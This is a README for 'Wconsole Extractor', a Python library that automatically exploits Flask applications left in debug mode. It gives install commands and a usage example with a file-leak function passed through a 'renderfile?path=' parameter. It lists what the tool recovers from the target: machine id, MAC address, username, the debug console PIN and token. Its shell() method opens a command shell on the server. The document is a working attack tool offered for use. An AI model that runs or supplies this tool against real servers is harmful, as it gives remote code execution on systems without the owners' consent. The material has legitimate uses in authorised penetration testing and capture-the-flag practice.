# Wconsole Extractor

## Description

Wconsole Extractor is a library which allows to automatically exploit a flask debug mode server. You just need to write a file leak function, pass it to the class ``WConsoleExtractor`` constructor and you can access to all the elements related to the debug mode.

## Installation

```
git clone https://github.com/Ruulian/wconsole_extractor.git
cd wconsole_extractor
pip3 install .
```

## Requirements

To use this library the following requirements need to be satisfied:
- Having a leak function written in Python 3 which takes a filename as parameter and returns the content
- Target operating system is Linux

## Usage

```py
from wconsole_extractor import WConsoleExtractor
import requests

def leak_file(filename) -> str:
    r = requests.get(f"http://localhost/renderfile?path={filename}")
    return r.text

extractor = WConsoleExtractor(
    target="http://localhost",
    leak_function=leak_file
)
```

You have now instanciated the ``WConsoleExtractor`` class, here is what you can access:
```py
# Properties
extractor.base_url             # => http://localhost
extractor.class_name           # => Flask
extractor.hostname             # => target hostname (e.g localhost)
extractor.machine_id           # => Machine id needed in private_bits
extractor.modname              # => flask.app
extractor.pin_code             # => debug console PIN CODE
extractor.private_bits         # => [leaked_uuid_get_node, leaked_machine_id]
extractor.probably_public_bits # => [username, modname, class_name, path_to_package]
extractor.python_version       # Python version running on target
extractor.target               # The target specified
extractor.token                # The token used to run a command in the debug console
extractor.username             # The username which probably launched the flask application
extractor.uuidnode             # The int mac address of the target host

# Methods
extractor.shell()              # Get a shell :)
```